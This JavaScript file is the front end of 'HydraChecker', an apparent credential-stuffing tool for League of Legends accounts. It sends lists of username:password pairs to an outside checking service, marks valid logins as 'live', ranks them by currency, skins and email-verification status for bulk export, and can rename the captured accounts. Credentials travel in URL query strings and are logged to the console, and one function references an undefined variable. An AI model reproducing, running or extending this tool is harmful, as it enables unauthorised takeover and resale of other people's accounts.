/**
 * Project: HydraChecker
 * Author: https://ayo.so/cookie
 */

let approvedList = [];

class Checker {
  constructor(key, list, banCheck) {
    this.key = key;
    this.list = list;
    this.banCheck = banCheck;
    this.isStarted = false;
    this.checkerUrl = "https://lol.hydranetwork.org";
    this.filterType = null;
    this.filterValue = null;
    this.valueToFilter = {
      rp: "rp",
      be: "be",
      level: "level",
      champs: "champions",
      skins: "skins",
      refunds: "storeRefunds",
      "email verified": "emailStatus",
    };
  }

  getStartedStatus() {
    return this.isStarted;
  }

  getApprovedList() {
    return approvedList;
  }

  setFilterType(type) {
    this.filterType = type;
  }

  setFilterValue(value) {
    this.filterValue = value;
  }

  setKey(key) {
    this.key = key;
  }

  setBanCheck(banCheck) {
    this.banCheck = banCheck;
  }

  setList(list) {
    this.list = list;
  }

  getFilterValue() {
    return this.filterValue;
  }

  getFilterType() {
    return this.filterType;
  }

  beforeStart() {
    changeCheckerStatus("Started");
    textArea.disabled = true;
    startCheckerButton.innerHTML = `<div class="spinner-border spinner-border-sm" role="status"><span class="visually-hidden">Loading...</span></div>`;
    startCheckerButton.disabled = true;
    clearDuplicatedLinesButton.disabled = true;
    keyInput.disabled = true;
  }

  async start() {
    this.beforeStart();
    this.isStarted = true;

    await Promise.all(
      this.list.map(async (account) => {
        const [username, password] = account.split(":");
        if (!username || !password) return;
        const data = await this.checkAccount(username, password);
        const tableType = data.status ? "live" : "die";
        if (tableType === "live") this.afterLive(data);
        if (tableType === "die") this.afterDie(data);
      })
    );

    this.afterFinish();
  }

  afterDie(data) {
    textArea.value = removeFirstLine(textArea.value);
    changeCheckerStatus("+1 error");
    rejectedCount++;
    updateCountStatus();
    const { trElement } = addAccountToTable(data, "die");
    dieTbody.appendChild(trElement);
  }

  async afterLive(data) {
    textArea.value = removeFirstLine(textArea.value);
    changeCheckerStatus("+1 success");
    approvedCount++;
    updateCountStatus();

    const { trElement, tooltipsIds } = addAccountToTable(data, "live");
    approvedList.push({ ...data, trElement, tooltipsIds });

    if (!this.filterType && !this.filterValue) {
      livesTbody.appendChild(trElement);
      if (data.canChangeNick) updateNickNameEventClick(tooltipsIds[2], data);
      removeAllActiveTooltips();
      this.updateAllTooltips();
      return;
    }

    this.clearApprovedAccounts();

    const sortedList = approvedList.sort((current, next) => {
      switch (this.filterValue) {
        case "up":
          if (
            this.valueToFilter[this.filterType.toLowerCase()] ===
            "email verified"
          ) {
            return ("" + current.emailStatus).localeCompare(next.emailStatus);
          }

          return (
            current[this.valueToFilter[this.filterType.toLowerCase()]] -
            next[this.valueToFilter[this.filterType.toLowerCase()]]
          );
        case "down":
          if (
            this.valueToFilter[this.filterType.toLowerCase()] ===
            "email verified"
          ) {
            return ("" + next.emailStatus).localeCompare(current.emailStatus);
          }

          return (
            next[this.valueToFilter[this.filterType.toLowerCase()]] -
            current[this.valueToFilter[this.filterType.toLowerCase()]]
          );
      }
    });

    await Promise.all(
      sortedList.map((item) => {
        livesTbody.appendChild(item.trElement);
      })
    );

    if (data.canChangeNick) updateNickNameEventClick(item.tooltipsIds[2], data);
    removeAllActiveTooltips();
    this.updateAllTooltips();
  }

  updateAllTooltips() {
    removeAllActiveTooltips();
    let tooltipTriggerList = [].slice.call(
      document.querySelectorAll('[data-bs-toggle="tooltip"]')
    );
    tooltipTriggerList.map(function (tooltipTriggerEl) {
      return new bootstrap.Tooltip(tooltipTriggerEl);
    });
  }

  afterFinish() {
    changeCheckerStatus("Finished");
    textArea.disabled = false;
    startCheckerButton.innerHTML = "Start";
    startCheckerButton.disabled = false;
    clearDuplicatedLinesButton.disabled = false;
    keyInput.disabled = false;
    this.isStarted = false;
  }

  copyAllApprovedAccounts(completeInformation = false) {
    if (approvedList.length === 0) return;
    let text;

    if (completeInformation) {
      text = approvedList
        .map((data) => {
          const topMasteryText = data.topMastery.map
            ? data.topMastery.map(
                (item, i) => `${item.champ} (${item.points}) - `
              )
            : "N/A";

          return `${data.account} - Nick: ${data.nickname} - RP: ${data.rp} - BE: ${data.be} - Top Mastery: ${topMasteryText} - Elo: ${data.currentElo} - OldElo: ${data.oldElo} - Champions: ${data.champions} - Skins: ${data.skins} - Email: ${data.email} (${data.emailStatus}) - Last Match: ${data.lastlolMatch} -  Region: ${data.region}`;
        })
        .join("\n");
    } else {
      text = approvedList.map((item) => `${item.account}`).join("\n");
    }

    copyToClipboard(text);
  }

  clearApprovedAccounts() {
    livesTbody.innerHTML = "";
    approvedCount = 0;
    updateCountStatus();
  }

  async checkAccount(username, password) {
    const banCheck = this.banCheck ? 1 : 0;
    const encodedUrl = encodeURI(
      `${this.checkerUrl}/api.php?type=CHECKER&bancheck=${banCheck}&key=${this.key}&login=${username}:${password}`
    );
    console.log(encodedUrl);
    const data = await fetch(encodedUrl, {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    }).then((res) => res.json());

    return {
      ...data,
      opGgUrl: data.opgg
        ? `https://${data.opgg.toLowerCase()}.op.gg/summoners/br/${
            data.nickname
          }`
        : null,
      account: `${username}:${password}`,
    };
  }

  async changeAccountNickname(account, newNickname, currency = "RP") {
    const data = await fetch(
      `${this.checkerUrl}/api.php?type=CHANGENICK&login=${account}&bancheck=1&key=${this.key}&changenick=${newNickname}&currency=${currency}`
    );
    return data.status;
  }

  async organizeTableByFilter() {
    const sortedList = approvedList.sort((current, next) => {
      switch (this.filterValue) {
        case "up":
          if (
            this.valueToFilter[this.filterType.toLowerCase()] ===
            "email verified"
          ) {
            return ("" + current.emailStatus).localeCompare(next.emailStatus);
          }

          return (
            current[this.valueToFilter[this.filterType.toLowerCase()]] -
            next[this.valueToFilter[this.filterType.toLowerCase()]]
          );
        case "down":
          if (
            this.valueToFilter[this.filterType.toLowerCase()] ===
            "email verified"
          ) {
            return ("" + next.emailStatus).localeCompare(current.emailStatus);
          }

          return (
            next[this.valueToFilter[this.filterType.toLowerCase()]] -
            current[this.valueToFilter[this.filterType.toLowerCase()]]
          );
      }
    });

    await Promise.all(
      sortedList.map((item) => {
        livesTbody.appendChild(item.trElement);
      })
    );

    removeAllActiveTooltips();
    this.updateAllTooltips();
  }
}
